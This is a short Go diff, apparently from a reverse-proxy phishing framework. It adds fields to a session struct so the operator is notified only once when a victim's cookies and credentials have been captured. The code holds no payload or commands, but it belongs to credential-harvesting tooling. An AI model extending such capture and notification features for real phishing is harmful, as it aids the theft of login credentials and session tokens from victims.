@@ -7,51 +7,55 @@ import (
 )
 
 type Session struct {
-	Id             string
-	Name           string
-	Username       string
-	Password       string
-	Custom         map[string]string
-	Params         map[string]string
-	BodyTokens     map[string]string
-	HttpTokens     map[string]string
-	CookieTokens   map[string]map[string]*database.CookieToken
-	RedirectURL    string
-	IsDone         bool
-	IsAuthUrl      bool
-	IsForwarded    bool
-	ProgressIndex  int
-	RedirectCount  int
-	PhishLure      *Lure
-	RedirectorName string
-	LureDirPath    string
-	DoneSignal     chan struct{}
-	RemoteAddr     string
-	UserAgent      string
+	Id                      string
+	Name                    string
+	Username                string
+	Password                string
+	Custom                  map[string]string
+	Params                  map[string]string
+	BodyTokens              map[string]string
+	HttpTokens              map[string]string
+	CookieTokens            map[string]map[string]*database.CookieToken
+	RedirectURL             string
+	IsDone                  bool
+	IsAuthUrl               bool
+	IsForwarded             bool
+	ProgressIndex           int
+	RedirectCount           int
+	PhishLure               *Lure
+	RedirectorName          string
+	LureDirPath             string
+	DoneSignal              chan struct{}
+	RemoteAddr              string
+	UserAgent               string
+	CookiesNotificationSent     bool // Track if cookies notification was already sent
+	CredentialsNotificationSent bool // Track if credentials notification was already sent
 }
 
 func NewSession(name string) (*Session, error) {
 	s := &Session{
-		Id:             GenRandomToken(),
-		Name:           name,
-		Username:       "",
-		Password:       "",
-		Custom:         make(map[string]string),
-		Params:         make(map[string]string),
-		BodyTokens:     make(map[string]string),
-		HttpTokens:     make(map[string]string),
-		RedirectURL:    "",
-		IsDone:         false,
-		IsAuthUrl:      false,
-		IsForwarded:    false,
-		ProgressIndex:  0,
-		RedirectCount:  0,
-		PhishLure:      nil,
-		RedirectorName: "",
-		LureDirPath:    "",
-		DoneSignal:     make(chan struct{}),
-		RemoteAddr:     "",
-		UserAgent:      "",
+		Id:                      GenRandomToken(),
+		Name:                    name,
+		Username:                "",
+		Password:                "",
+		Custom:                  make(map[string]string),
+		Params:                  make(map[string]string),
+		BodyTokens:              make(map[string]string),
+		HttpTokens:              make(map[string]string),
+		RedirectURL:             "",
+		IsDone:                  false,
+		IsAuthUrl:               false,
+		IsForwarded:             false,
+		ProgressIndex:           0,
+		RedirectCount:           0,
+		PhishLure:               nil,
+		RedirectorName:          "",
+		LureDirPath:             "",
+		DoneSignal:              make(chan struct{}),
+		RemoteAddr:              "",
+		UserAgent:               "",
+		CookiesNotificationSent:     false,
+		CredentialsNotificationSent: false,
 	}
 	s.CookieTokens = make(map[string]map[string]*database.CookieToken)
 
